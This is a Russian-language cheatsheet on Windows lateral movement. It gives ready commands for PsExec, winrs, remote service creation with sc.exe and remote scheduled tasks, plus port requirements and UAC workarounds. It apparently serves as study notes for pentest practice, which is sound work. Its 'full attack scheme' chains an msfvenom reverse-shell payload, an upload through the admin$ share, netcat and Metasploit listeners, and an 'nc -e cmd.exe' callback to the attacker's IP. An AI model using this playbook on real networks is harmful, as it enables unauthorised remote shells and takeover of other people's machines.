## 🔐 Lateral Movement & Pivoting - Cheatsheet (общие названия)

### 📌 ДВЕ МАШИНЫ

| Машина | Что это | Как доступаемся |
|--------|---------|-----------------|
| **Хост А** | Первая машина (твой плацдарм) | Есть прямой доступ (SSH, RDP и т.д.) |
| **Хост Б** | Вторая машина (цель) | Нет прямого доступа, но есть админские пароли |

**Важно:** Все команды для атаки на Хост Б ты выполняешь **на Хосте А** (через доступ, который у тебя уже есть). Твоя домашняя машина не имеет прямого доступа к Хосту Б.

---

### 🔌 Какие порты должны быть открыты на Хосте Б

| Метод | Порты | Протокол |
|-------|-------|----------|
| **PsExec** | 445/TCP | SMB (нужен доступ к `ADMIN$`) |
| **WinRM** | 5985/TCP (HTTP) или 5986/TCP (HTTPS) | HTTP/HTTPS |
| **sc.exe** | 135/TCP, 49152-65535/TCP (динамические) | DCE/RPC |
| **sc.exe (fallback)** | 445/TCP или 139/TCP | RPC over SMB (named pipes) |
| **schtasks** | 135/TCP, 445/TCP | RPC, SMB |

**Самое важное:** Если открыт **порт 445 (SMB)** — ты можешь использовать `sc.exe` и `schtasks`.  
Если открыт **порт 5985 (WinRM)** — ты можешь использовать `winrs`.


### 🚦 UAC Restrictions

**Проблема:** При удалённом подключении локальный администратор (не встроенный Administrator) получает урезанные права.

| Тип аккаунта | Удалённо работает? |
|--------------|---------------------|
| Domain admin | ✅ Да, полные права |
| Локальный админ (обычный) | ❌ Нет, UAC блокирует |
| Встроенный `Administrator` | ✅ Да |

**Что делать:** Если команды не работают с локальным админом — попробуй встроенного `Administrator`.


### 🛠️ PsExec

**Что делает:** Одна команда → и ты получаешь командную строку на удалённой машине.

**Где выполняешь:** На Хосте А (в админском shell, полученном через runas, или если у тебя уже есть админские права на Хосте А).

**Куда подключается:** К Хосту Б.

**Команда:**
```cmd
psexec64.exe \\IP_ХОСТА_Б -u ИМЯ -p ПАРОЛЬ -i cmd.exe
```

**Результат:** Командная строка Хоста Б.

**Требования:** Открыт порт **445/TCP** (SMB) на Хосте Б.


### 🔌 WinRM

**Что делает:** Тоже даёт удалённую командную строку, но через другой протокол.

**Где выполняешь:** На Хосте А.

**Команда:**
```cmd
winrs.exe -u:ИМЯ -p:ПАРОЛЬ -r:IP_ХОСТА_Б cmd
```

**Результат:** Командная строка Хоста Б.

**Требования:** Открыт порт **5985/TCP** (WinRM HTTP) или **5986/TCP** (WinRM HTTPS) на Хосте Б.

**Важно:** При использовании IP-адреса нужно добавить цель в `TrustedHosts`:
```cmd
winrm set winrm/config/client @{TrustedHosts="IP_ХОСТА_Б"}
```


### ⚙️ sc.exe (создание сервиса)

**Что делает:** Создаёт сервис на удалённой машине. Когда запустишь сервис — Windows выполнит программу, которую ты указал.

**Где выполняешь:** На Хосте А (только в админском shell).

**Почему используется:** PsExec и WinRM могут быть заблокированы. `sc.exe` есть везде.

**Проблема:** `sc.exe` не умеет принимать пароль в команде. Тебе нужен **админский shell на Хосте А**, чтобы запустить `sc.exe`.

**Создать сервис:**
```cmd
sc.exe \\IP_ХОСТА_Б create ИМЯ_СЕРВИСА binPath= "ПУТЬ_К_ФАЙЛУ" start= auto
```

**Запустить сервис:**
```cmd
sc.exe \\IP_ХОСТА_Б start ИМЯ_СЕРВИСА
```

**Удалить сервис:**
```cmd
sc.exe \\IP_ХОСТА_Б delete ИМЯ_СЕРВИСА
```

**Важно:** Пробел после `binPath=` и `start=` ОБЯЗАТЕЛЕН.

**Требования:** Открыты порты **135/TCP** и диапазон **49152-65535/TCP** (DCE/RPC).  
Если RPC не работает — используется fallback через SMB: порт **445/TCP** или **139/TCP**.

### 📅 schtasks (запланированные задачи)

**Что делает:** Создаёт задачу на удалённой машине. Когда запустишь задачу — выполнится команда.

**Где выполняешь:** На Хосте А (в админском shell).

**Создать задачу:**
```cmd
schtasks /s IP_ХОСТА_Б /RU "SYSTEM" /create /tn "ИМЯ_ЗАДАЧИ" /tr "КОМАНДА" /sc ONCE /sd 01/01/1970 /st 00:00
```

**Запустить задачу:**
```cmd
schtasks /s IP_ХОСТА_Б /run /tn "ИМЯ_ЗАДАЧИ"
```

**Удалить задачу:**
```cmd
schtasks /s IP_ХОСТА_Б /tn "ИМЯ_ЗАДАЧИ" /delete /f
```

**Требования:** Открыты порты **135/TCP** (RPC) и **445/TCP** (SMB).


### 🔁 Полная схема атаки (reverse shell через сервис)

**Ситуация:**
- У тебя есть доступ к Хосту А (не админский).
- У тебя есть админские пароли от Хоста Б.
- Ты хочешь получить shell на Хосте Б (прямого входа нет).
- На Хосте Б открыт порт **445 (SMB)**, но нет WinRM или PsExec не работает.

**Шаги:**

1. **Создаёшь reverse shell payload на своей машине:**
   ```bash
   msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ТВОЙ_IP LPORT=4444 -o payload.exe
   ```

2. **Загружаешь payload на Хост Б через admin$ (с твоей машины):**
   ```bash
   smbclient -c 'put payload.exe' -u АДМИН_ХОСТА_Б -W ДОМЕН '//IP_ХОСТА_Б/admin$/' ПАРОЛЬ
   ```

3. **Открываешь слушатели на своей машине:**
   ```bash
   nc -lvp 4443
   msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST ТВОЙ_IP; set LPORT 4444; exploit"
   ```

4. **Заходишь на Хост А (по SSH или другому протоколу).**

5. **Запускаешь runas на Хосте А, чтобы получить админский shell (он подключится к твоему nc):**
   ```cmd
   runas /netonly /user:ДОМЕН\АДМИН "c:\tools\nc64.exe -e cmd.exe ТВОЙ_IP 4443"
   ```

6. **Из админского shell на Хосте А создаёшь и запускаешь сервис на Хосте Б:**
   ```cmd
   sc.exe \\IP_ХОСТА_Б create MyService binPath= "C:\Windows\payload.exe" start= auto
   sc.exe \\IP_ХОСТА_Б start MyService
   ```

7. **В msfconsole ловишь подключение от Хоста Б и получаешь shell.**

### 📝 Ключевые нюансы

| Нюанс | Объяснение |
|-------|------------|
| Команды для атаки на Хост Б выполняются **на Хосте А** | Потому что Хост А и Хост Б в одной сети, а твоя машина — снаружи |
| `sc.exe` не принимает пароль | Нужен админский shell на Хосте А, полученный через `runas` |
| `runas /netonly` | Не проверяет пароль локально. Проверка только при подключении к удалённой машине |
| `admin$` | Скрытая сетевая папка `C:\Windows`. Доступна только администраторам. Через неё загружаем файлы на Хост Б |
| Reverse shell | Хост Б сам подключается к тебе, потому что у тебя нет прямого входа на него |
| Два слушателя | Один — для админского shell Хоста А, второй — для shell Хоста Б |
| **Порт 445 (SMB)** | Самый важный порт. Если он открыт — можно загружать файлы через `admin$` и использовать `sc.exe` |
| **Порт 135 (RPC)** | Нужен для `sc.exe` и `schtasks`. Если закрыт — используется fallback через SMB (порт 445) |
| **Порт 5985 (WinRM)** | Если открыт — самый простой способ получить shell через `winrs` |
| **UAC блокирует локальных админов** | Если используешь обычного локального админа, многие команды не сработают. Используй domain admin или встроенного `Administrator` |

### ✅ Быстрая проверка доступа к Хосту Б

Перед любой атакой проверь, какие порты открыты:

```cmd
# Проверка SMB (порт 445)
net use \\IP_ХОСТА_Б\IPC$ /user:ДОМЕН\АДМИН ПАРОЛЬ

# Если команда успешна — SMB работает, можно использовать sc.exe, schtasks, загрузку файлов
```

```cmd
# Проверка WinRM (порт 5985)
telnet IP_ХОСТА_Б 5985

# Если открывается — WinRM работает, можно использовать winrs
```

```cmd
# Проверка RPC (порт 135)
telnet IP_ХОСТА_Б 135

# Если открывается — RPC работает, sc.exe и schtasks будут работать напрямую
